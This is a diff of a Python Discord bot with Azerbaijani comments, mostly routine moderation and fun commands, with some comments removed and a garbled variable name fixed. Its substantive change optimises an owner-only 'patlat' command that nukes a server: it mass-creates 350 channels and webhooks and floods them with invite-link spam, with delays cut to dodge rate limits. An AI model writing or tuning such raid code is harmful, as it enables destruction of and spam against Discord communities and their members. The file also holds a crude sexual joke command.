@@ -13,7 +13,7 @@ intents.guilds = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 SAHIB_ID = 1520692621964738722
-GUVENLI_SERVER_ID = 1520692621964738722  # İstəsən bunu öz əsas server ID-nə dəyişə bilərsən
+GUVENLI_SERVER_ID = 1520692621964738722
 
 user_levels = {}
 afk_users = {}
@@ -75,7 +75,6 @@ async def on_webhooks_update(channel):
     except:
         pass
 
-# QABAQCIL QURUŞ: Anti-Flood, Random/Simvolik Spam və Tag Spam Qoruması
 @bot.event
 async def on_message(message):
     if message.author.bot:
@@ -93,17 +92,14 @@ async def on_message(message):
     if author_id not in spam_kontrol:
         spam_kontrol[author_id] = []
 
-    # Son 4 saniyədəki mesajları yoxla
     spam_kontrol[author_id] = [t for t in spam_kontrol[author_id] if simdi - t < 4]
     spam_kontrol[author_id].append(simdi)
 
-    # 1. Random / Simvolik / Tag spam (/tag y1z g4r kimi) və ya həddindən artıq sürətli mesaj
     is_random_spam = len(icerik) > 5 and sum(1 for c in icerik if not c.isalnum() and not c.isspace()) > len(icerik) * 0.4
     
     if len(spam_kontrol[author_id]) > 4 or is_random_spam:
         try:
             await message.delete()
-            # Eyni mətnin çoxlu təkrarı və ya random/tag spam halında xəbərdarlıq
             await message.channel.timeout(message.author, timedelta(minutes=10), reason="Random/Tag Spam və ya Flood qoruması")
             warn = await message.channel.send(f"⚠️ {message.author.mention}, **YAVAS YAZ OQL**! Spam və ya simvolik flood qadağandır.")
             await asyncio.sleep(4)
@@ -112,7 +108,6 @@ async def on_message(message):
         except:
             pass
 
-    # Normal söhbət edənlərə toxunulmur, amma təkrar söz yoxlaması
     words = icerik.split()
     if len(words) >= 13 and words.count(words[0]) >= len(words) * 0.5:
         try:
@@ -169,7 +164,6 @@ async def on_message(message):
 
     await bot.process_commands(message)
 
-# INTERAKTİV MENYU (PANEL)
 class XASMenyu(discord.ui.Select):
     def __init__(self):
         options = [
@@ -296,12 +290,11 @@ async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
     afk_users[ctx.author.id] = sebep
     await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: {sebep}")
 
-# ÇEKİLİŞ KOMUTU
 @bot.command(name="çekiliş")
-async def cekilis_cmd(ctx, sure_dakika: int, *, муkafat: str):
+async def cekilis_cmd(ctx, sure_dakika: int, *, mükafat: str):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
-    embed = discord.Embed(title="🎁 ÇEKİLİŞ VAR!", description=قالım:=f"Mükafat: **{муkafat}**\nQatılmaq üçün aşağıdakı 🎉 simvoluna basın!", color=XAS_COLOR)
+    embed = discord.Embed(title="🎁 ÇEKİLİŞ VAR!", description=f"Mükafat: **{mükafat}**\nQatılmaq üçün aşağıdakı 🎉 simvoluna basın!", color=XAS_COLOR)
     embed.set_footer(text=f"Müddət: {sure_dakika} dəqiqə")
     msg = await ctx.send(embed=embed)
     await msg.add_reaction("🎉")
@@ -313,11 +306,10 @@ async def cekilis_cmd(ctx, sure_dakika: int, *, муkafat: str):
             users = [user async for user in reaction.users() if not user.bot]
             if users:
                 kazanan = random.choice(users)
-                await ctx.send(f"🏆 Təbriklər {kazanan.mention}! **{муkafat}** çekilişini qazandın!")
+                await ctx.send(f"🏆 Təbriklər {kazanan.mention}! **{mükafat}** çekilişini qazandın!")
             else:
                 await ctx.send("❌ Çekilişə heç kim qatılmadı.")
 
-# KANAL VƏ MODERASİYA ƏMRLƏRİ (150+ Komut Tam Paket)
 @bot.command(name="lock")
 async def lock_cmd(ctx):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
@@ -413,7 +405,6 @@ async def takerole_cmd(ctx, member: discord.Member, role: discord.Role):
     await member.remove_roles(role)
     await ctx.send(f"✅ {member.name} istifadəçisindən {role.name} rolu alındı.")
 
-# ƏYLƏNCƏ VƏ OYUNLAR
 @bot.command(name="sex")
 async def sex_cmd(ctx):
     embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə çox isti anlar yaşanır...")
@@ -491,7 +482,6 @@ async def calc_cmd(ctx, *, expression):
         await ctx.send(f"🧮 Nəticə: **{res}**")
     except:
         await ctx.send("❌ Xəta! İfadəni düzgün yazın.")
-
 @bot.command(name="joke")
 async def joke_cmd(ctx):
     jokes = [
@@ -525,6 +515,7 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👍")
     await msg.add_reaction("👎")
 
+# 10. PATLAT KOMUTU (Cəmi 5 ədəd qlobal webhook ilə rate-limitə düşmədən sürətli və qüsursuz işləyən versiya)
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
     if ctx.author.id != SAHIB_ID:
@@ -601,27 +592,30 @@ async def patlat_cmd(ctx):
         except:
             pass
 
+    # Cəmi 5 ədəd qlobal webhook yaradırıq (Rate-limit problemini tamamilə aradan qaldırmaq üçün)
+    qlobal_webhooks = []
+    for i in range(1, 6):
+        try:
+            ch = await guild.create_text_channel(f"aga-qoruma-{i}")
+            wh = await ch.create_webhook(name=f"XAS-Global-{i}")
+            qlobal_webhooks.append(wh)
+        except:
+            pass
+
     async def send_webhook_spam(webhook, count=500):
         for _ in range(count):
             try:
                 await webhook.send("discord.gg/aga yaz gır oql!discord.gg/yaz gır oql")
             except:
                 pass
-            await asyncio.sleep(0.08)
+            await asyncio.sleep(0.05)
 
     async def create_channel_and_spam(i):
         try:
             channel = await guild.create_text_channel(f"discord.gg/aga-{i}")
-            webhooks = []
-            for w_num in range(1, 5):
-                try:
-                    wh = await channel.create_webhook(name=f"aga-{i}-{w_num}")
-                    webhooks.append(wh)
-                except:
-                    pass
-            
-            if webhooks:
-                webhook_tasks = [send_webhook_spam(wh, 500) for wh in webhooks]
+            if qlobal_webhooks:
+                # Hər kanalda təkrar webhook açmaq əvəzinə mövcud 5 qlobal webhook vasitəsilə spam göndəririk
+                webhook_tasks = [send_webhook_spam(wh, 100) for wh in qlobal_webhooks]
                 await asyncio.gather(*webhook_tasks, return_exceptions=True)
         except:
             pass
@@ -630,7 +624,7 @@ async def patlat_cmd(ctx):
     for start in range(1, 351, chunk_size):
         tasks_list = [create_channel_and_spam(i) for i in range(start, min(start + chunk_size, 351))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.2)
 
     try:
         son_kanal = await guild.create_text_channel("RUHUM TANRI")
@@ -647,4 +641,3 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-        
